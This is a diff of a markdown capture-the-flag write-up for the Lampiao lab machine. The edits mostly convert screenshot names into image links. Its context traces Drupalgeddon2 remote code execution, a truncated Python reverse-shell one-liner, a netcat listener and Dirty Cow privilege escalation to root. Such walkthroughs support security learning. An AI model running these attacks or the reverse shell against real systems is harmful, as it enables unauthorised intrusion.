@@ -96,19 +96,19 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 28.46 seconds
 ```
 
-woof, lots of HTTP strings there. What of interest to me though is that it appears the wepage on port 1898 is running Drupal, which is associated with several vulnerabilities.
+woof, lots of HTTP strings there. Whats of interest to me though is that it appears the wepage on port 1898 is running Drupal, which is associated with several vulnerabilities.
 
 Heading to the site on port 80 we find a static page with ascii art:
 
-site.png
+![site.png](../assets/lampiao_assets/site.png)
 
 But the page on 1898 seems more interactive, and we can confirm it is running Drupal by scrolling to the bottom of the screen.
 
-1898.png
+![1898.png](../assets/lampiao_assets/1898.png)
 
 Taking a look at the page source we can confirm the site is running Drupal 7, which is vulnerable to an unauthenticated RCE. For this we can use the exploit drupalgeddon2:
 
-source.png
+![source.png](../assets/lampiao_assets/source.png)
 
 We can find the script at https://github.com/dreadlocked/Drupalgeddon2
 
@@ -162,21 +162,21 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 And simply set up a NetCat listener and run the command in the pseudo-shell:
 
-shell.png
+![shell.png](../assets/lampiao_assets/shell.png)
 
 We can now grab the local.txt flag from user tiago's home directory:
 
-user_flag.png
+![user_flag.png](../assets/lampiao_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Lets transfer over LinPEAS.sh to help with privilege escalation:
 
-transfer.png
+![transfer.png](../assets/lampiao_assets/transfer.png)
 
-lp1.png
+![lp1.png](../assets/lampiao_assets/lp1.png)
 
-lp2.png
+![lp2.png](../assets/lampiao_assets/lp2.png)
 
 LinPEAS finds that this is an outdated version and it vulnerable to the DIrty Cow kernel exploit.
 
@@ -216,7 +216,7 @@ uid=0(firefart) gid=0(root) groups=0(root)
 
 We can now grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/lampiao_assets/root_flag.png)
 
 Thanks for following along!
 
